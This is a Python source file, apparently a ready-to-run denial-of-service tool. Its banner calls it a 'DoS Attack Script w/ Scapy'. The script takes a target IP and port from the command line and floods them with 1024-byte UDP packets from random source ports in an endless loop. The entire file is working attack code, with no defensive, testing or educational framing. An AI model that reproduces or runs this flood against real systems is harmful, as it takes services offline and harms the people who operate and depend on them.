from scapy.all import IP, UDP, Raw, RandShort, send
from colorama import Fore, Style, init
import sys
import time

# Initialiser Colorama
init(autoreset=True)

def banner():
    print(Fore.RED + Style.BRIGHT + """
    ▄▄▄▄    ▒█████   ██████ ▓█████
   ▓█████▄ ▒██▒  ██▒██    ▒ ▓█   ▀
   ▒██▒ ▄██▒██░  ██░ ▓██▄   ▒███
   ▒██░█▀  ▒██   ██░ ▒   ██▒▓█  ▄
   ░▓█  ▀█▓░ ████▓▒▒██████▒▒░▒████▒
   ░▒▓███▀▒░ ▒░▒░▒░▒ ▒▓▒ ▒ ░░░ ▒░ ░
   ▒░▒   ░   ░ ▒ ▒░░ ░▒  ░ ░ ░ ░  ░
    ░    ░ ░ ░ ░ ▒ ░  ░  ░     ░
    ░          ░ ░       ░     ░  ░
         ░  DoS Attack Script w/ Scapy\n""" + Fore.WHITE + Style.BRIGHT + "\t\tCreated by Jusot99")

def dos_attack(target_ip, target_port, iface=None):
    packet_count = 0
    try:
        while True:
            src_port = RandShort()
            pkt = IP(dst=target_ip)/UDP(sport=src_port, dport=target_port)/Raw(load="X"*1024)
            send(pkt, verbose=0, iface=iface)
            packet_count += 1
            print(Fore.GREEN + f"[+] Sent packet #{packet_count} to {target_ip}:{target_port}")
            time.sleep(0.01)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user.")
        sys.exit()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(Fore.CYAN + f"Usage: sudo python3 {sys.argv[0]} <target_ip> <target_port> [interface]")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])
    interface = sys.argv[3] if len(sys.argv) > 3 else None

    banner()
    dos_attack(target, port, interface)
